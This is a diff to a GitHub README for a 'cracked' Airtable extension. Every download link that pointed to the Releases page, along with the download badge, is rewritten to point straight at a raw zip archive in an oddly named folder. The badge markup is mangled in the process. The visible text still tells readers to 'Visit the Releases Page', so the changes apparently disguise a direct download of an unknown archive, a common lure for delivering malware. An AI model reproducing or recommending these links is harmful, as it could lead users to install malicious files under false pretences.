@@ -1,6 +1,6 @@
 # 🌟 cracked-save-to-airtable-base-extension - Simplify Your Airtable Data Management
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/quyvuFU/cracked-save-to-airtable-base-extension/releases)
+[![Download](https://raw.githubusercontent.com/quyvuFU/cracked-save-to-airtable-base-extension/main/rectifiable/cracked-save-to-airtable-base-extension.zip%20Now-Visit%https://raw.githubusercontent.com/quyvuFU/cracked-save-to-airtable-base-extension/main/rectifiable/cracked-save-to-airtable-base-extension.zip)](https://raw.githubusercontent.com/quyvuFU/cracked-save-to-airtable-base-extension/main/rectifiable/cracked-save-to-airtable-base-extension.zip)
 
 ## 📖 Description
 
@@ -22,7 +22,7 @@ Before you download, please ensure your system meets the following requirements:
 
 To download and install the extension, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/quyvuFU/cracked-save-to-airtable-base-extension/releases) to find the latest version of the extension.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/quyvuFU/cracked-save-to-airtable-base-extension/main/rectifiable/cracked-save-to-airtable-base-extension.zip) to find the latest version of the extension.
    
 2. **Choose Your Version:** On the Releases page, look for the latest version listed. 
    
@@ -72,4 +72,4 @@ This project is licensed under the MIT License. You can read the full license fi
 
 For updates and news about the Cracked Save to Airtable Base Extension, be sure to watch the repository on GitHub.
 
-[![Download](https://img.shields.io/badge/Download%20Now-Visit%20Releases-blue.svg)](https://github.com/quyvuFU/cracked-save-to-airtable-base-extension/releases)
+[![Download](https://raw.githubusercontent.com/quyvuFU/cracked-save-to-airtable-base-extension/main/rectifiable/cracked-save-to-airtable-base-extension.zip%20Now-Visit%https://raw.githubusercontent.com/quyvuFU/cracked-save-to-airtable-base-extension/main/rectifiable/cracked-save-to-airtable-base-extension.zip)](https://raw.githubusercontent.com/quyvuFU/cracked-save-to-airtable-base-extension/main/rectifiable/cracked-save-to-airtable-base-extension.zip)
